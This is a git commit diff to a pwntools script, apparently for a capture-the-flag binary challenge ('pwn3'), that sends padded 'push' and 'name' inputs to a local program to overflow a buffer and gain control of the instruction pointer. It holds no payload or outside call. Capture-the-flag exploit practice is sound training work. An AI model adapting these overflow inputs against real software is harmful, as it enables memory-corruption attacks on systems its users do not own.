8e35123614c576e7bbb2cb101ab2c957c155ce4a
Ubuntu <ubuntu@ip-172-26-5-91.ec2.internal>
2020-03-15 21:03:01 +0000

    Have control of RIP in pwn3

--- PWN/pwn3/hack.py
+++ PWN/pwn3/hack.py
@@ -2,8 +2,47 @@ from pwn import *
 
 p = process("./pwn_me")
 
-def hop_in_debugger():
+def initial_heap_overflow():
+    name = b'B'*0x200
+    stack_buffer = b'A'*0x244 + b'X'*8
+    print(" b malloc ; so you can see where the space is allocated")
+    input()
+    print(p.recv())
+    p.sendline(b'push ' + stack_buffer)
+    print(p.recv())
+    p.sendline(b'name ' + name)
+    print(p.recv())
+    p.interactive()
+
+def first_name_overflow():
+    name = b'B'*0x200
+    stack_buffer_1 = b'A'*0x244 + b'X'*8
+    stack_buffer_2 = b'C'*0x244 + b'Y'*4 + b'Z'*4
+    print(" b malloc ; so you can see where the space is allocated")
+    input()
+    print(p.recv())
+    print("DEBUG: Send first push?")
+    input()
+    p.sendline(b'push ' + stack_buffer_1)
+    print(p.recv())
+    print("DEBUG: Send name?")
+    input()
+    p.sendline(b'name ' + name)
+    print(p.recv())
+    print("DEBUG: Send pop?")
+    input()
+    p.sendline(b'pop 1')
+    print(p.recv())
+    print("DEBUG: Send second push?")
+    input()
+    p.sendline(b'push ' + stack_buffer_2)
+    print("DEBUG: Receive push output")
+    input()
+    print(p.recv())
+    print("DEBUG: Go interactive?")
+    input()
     p.interactive()
 
 if __name__=='__main__':
-    hop_in_debugger()
+    #initial_heap_overflow()
+    first_name_overflow()
